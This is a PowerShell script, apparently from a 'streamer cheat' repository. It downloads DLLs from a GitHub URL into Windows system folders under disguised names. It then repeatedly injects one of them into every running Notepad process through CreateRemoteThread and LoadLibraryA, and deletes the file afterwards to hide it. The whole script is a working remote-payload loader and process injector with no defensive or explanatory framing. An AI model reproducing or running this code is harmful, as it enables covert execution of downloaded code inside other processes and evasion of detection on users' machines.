# Constants
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04

# DLLs
$dll1Url = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/colorgui.dll.mun"         # 👈 You will provide this
$dll1Path = "C:\Windows\System32\colorgui.dll.mun"

$dll2Url = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"         # 👈 DLL for injection
$dll2Path = "C:\Windows\ShellJector.tlb"

# P/Invoke definitions
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

# Step 1: Download DLL1 (only once)
try {
    Invoke-WebRequest -Uri $dll1Url -OutFile $dll1Path -UseBasicParsing -ErrorAction Stop
    Write-Host "✅ DLL1 downloaded at $dll1Path" -ForegroundColor Green
} catch {
    Write-Host "❌ Failed to download DLL1. Exiting." -ForegroundColor Red
    exit 1
}

# Step 2: Start Notepad monitoring and inject DLL2
while ($true) {
    # Wait for Notepad to run
    do {
        $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    } while (-not $notepad)

    # Download DLL2 (only when Notepad is running)
    try {
        Invoke-WebRequest -Uri $dll2Url -OutFile $dll2Path -UseBasicParsing -ErrorAction Stop
        Write-Host "✅ DLL2 downloaded." -ForegroundColor Green
    } catch {
        Write-Host "❌ Failed to download DLL2." -ForegroundColor Red
        continue
    }

    # Inject DLL2 into each running Notepad process
    foreach ($proc in $notepad) {
        $processId = $proc.Id
        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)

        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "❌ Cannot open Notepad process (PID: $processId)" -ForegroundColor Red
            continue
        }

        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dll2Path + [char]0)
        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

        if ($allocMem -eq [IntPtr]::Zero) {
            Write-Host "❌ Memory allocation failed for PID $processId" -ForegroundColor Red
            continue
        }

        $outSize = [IntPtr]::Zero
        $writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$outSize)

        if (-not $writeResult) {
            Write-Host "❌ Failed to write memory in Notepad (PID: $processId)" -ForegroundColor Red
            continue
        }

        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

        if ($loadLibraryAddr -eq [IntPtr]::Zero) {
            Write-Host "❌ LoadLibraryA not found." -ForegroundColor Red
            continue
        }

        $threadId = [IntPtr]::Zero
        $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)

        if ($hThread -eq [IntPtr]::Zero) {
            Write-Host "❌ Thread creation failed for PID: $processId" -ForegroundColor Red
        } else {
            Write-Host "✅ DLL2 injected into Notepad (PID: $processId)" -ForegroundColor Cyan
        }
    }

    # Wait a few seconds then delete DLL2
    Start-Sleep -Seconds 5
    Remove-Item $dll2Path -Force -ErrorAction SilentlyContinue
    Write-Host "🧹 DLL2 deleted. Monitoring continues..." -ForegroundColor Yellow

    # Wait until all Notepad instances are closed
    do {
        $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    } while ($notepad)

    Write-Host "🔁 Notepad closed. Restarting monitor..." -ForegroundColor Gray
}
